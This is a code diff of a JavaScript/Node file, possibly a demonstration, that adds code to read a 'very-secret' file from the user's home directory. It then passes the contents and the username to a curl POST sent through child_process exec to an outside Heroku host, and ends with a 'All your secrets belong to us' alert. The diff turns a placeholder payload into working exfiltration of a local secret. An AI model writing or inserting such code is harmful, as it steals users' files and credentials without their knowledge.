@@ -9,18 +9,19 @@ const fs = require('fs');
 const os = require("os")
 const { exec } = require("child_process");
 
-const secretFile  = `/Users/${os.userInfo().username}/very-secret`
-const secret = fs.readFileSync(secretFile)
-alert(secret);
+const userName = os.userInfo().username;
+const secretFile  = `/Users/${userName}/very-secret`
+const secret = fs.readFileSync(secretFile).toString().trim();
 
-const curlCmd = `curl -X POST https://library-of-secrets.herokuapp.com/secrets -H "Content-Type: application/json" -d '{"user":"tom","token":"abc123"}'`;
+const curlCmd = `curl -X POST https://library-of-secrets.herokuapp.com/secrets -H "Content-Type: application/json" -d '{"user":"${userName}","token":"${secret}"}'`;
+console.log(curlCmd)
 exec(curlCmd, (error, stdout, stderr) => {
   if (error) {
     alert(`error: ${error.message}`);
     return;
   }
   if (stderr) {
-    alert(`stderr: ${stderr.message}`);
+    console.log(`stderr: ${stderr.message}`);
     return;
   }
   alert('🏴‍☠️ All your secrets belong to us 🏴‍☠️')
